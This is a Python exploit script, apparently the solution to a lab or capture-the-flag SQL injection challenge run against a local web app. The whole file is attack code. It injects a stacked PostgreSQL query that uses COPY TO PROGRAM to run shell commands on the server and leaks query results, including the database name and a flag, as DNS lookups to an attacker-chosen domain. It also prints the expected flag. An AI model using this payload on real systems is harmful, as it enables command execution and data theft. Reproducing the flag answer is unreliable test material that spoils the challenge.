#!/usr/bin/env python3
"""SQLi-041: PostgreSQL OOB DNS via COPY TO PROGRAM"""
import requests
import argparse

def send_oob(url, query, oob_domain):
    payload = f"1;COPY ({query}) TO PROGRAM 'xargs -I{{}} nslookup {{}}.{oob_domain}'--"
    try:
        requests.get(url, params={"id": payload}, timeout=10)
    except:
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5041/user")
    parser.add_argument("--oob", required=True)
    args = parser.parse_args()
    
    print(f"[*] Target: {args.target}")
    print(f"[*] OOB: {args.oob}")
    
    print("\n[1] Extracting database...")
    send_oob(args.target, "SELECT current_database()", args.oob)
    
    print("[2] Extracting flag...")
    send_oob(args.target, "SELECT value FROM flags WHERE name='sqli_041'", args.oob)
    
    print(f"\n[*] Check DNS: <data>.{args.oob}")
    print("[*] Expected: FLAG{postgres_copy_to_program_dns}")

if __name__ == "__main__":
    main()
